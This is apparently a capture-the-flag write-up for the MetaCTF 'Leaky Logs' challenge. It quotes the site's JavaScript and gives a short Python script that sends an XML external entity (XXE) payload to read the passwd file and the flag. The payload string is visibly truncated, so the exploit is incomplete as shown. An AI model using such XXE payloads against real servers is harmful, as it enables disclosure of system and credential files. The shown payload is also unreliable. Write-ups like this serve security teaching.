# Leaky Logs

This challenge was based around an XML Injection.  
We first analyzed the source and found a weird js code to send xml data to the
server at this url: `http://host1.metaproblems.com:4920/events`  
```js  
   function keyup(e) {  
       if (e.keyCode === 13) {  
           search(document.getElementById("searchbar").value);  
       }  
   }

   function search(query) {  
       console.log(query);

       let doc = document.implementation.createDocument("", "", null);  
       let elem = doc.createElement("params");  
       let queryparam = doc.createElement("query");  
       queryparam.innerHTML = query;  
       elem.appendChild(queryparam);  
       doc.appendChild(elem);  
       const serializer = new XMLSerializer();  
       const xmlStr = serializer.serializeToString(doc);  
       console.log(xmlStr);

       fetch("/api/event_log", {  
               method: "POST",  
               headers: {  
                   'Content-Type': 'text/xml'  
               },  
               body: xmlStr  
           })  
           .then(data => data.text())  
           .then(str => new window.DOMParser().parseFromString(str, "text/xml"))  
           .then(data => {  
               const tableBody = document.getElementById("table-body");  
               while (tableBody.firstChild) {  
                   tableBody.firstChild.remove()  
               }

               for (e of data.getElementsByTagName("event")) {  
                   const row = tableBody.insertRow(-1);  
                   row.insertCell(-1).innerHTML = e.getAttribute("date");  
                   row.insertCell(-1).innerHTML = e.innerHTML;  
                   let symbol = "cart";  
                   if (e.innerHTML.includes("finished")) {  
                       symbol = "user";  
                   } else if (e.innerHTML.includes("resumed")) {  
                       symbol = "cog";  
                   }  
                   row.insertCell(-1).innerHTML = "<span></span>";  
               }  
           });  
   }

   search("");  
```

So we assumed that we can extract files over a XXE and crafted a small exploit
script

```  
import requests

def exploit():  
   res = requests.post("http://host1.metaproblems.com:4920/api/event_log",  
                       data="]><params><query>&xx;;</query></params>",  
                       headers={"Content-Type": "text/xml"})  
   print(res.content.decode())  
   pass

exploit()  
```

And we got a response of the passwd file. Now we need find and exfiltrate the
flag. We found it at the root path at  
/flag  
with the content:  
```  
MetaCTF{el3m3nt4l_3xtern4lit1e5}  
```

Original writeup (https://github.com/PwnProphecy/ctf/blob/main/metactf-
cybergames2021/Leaky-Logs.md).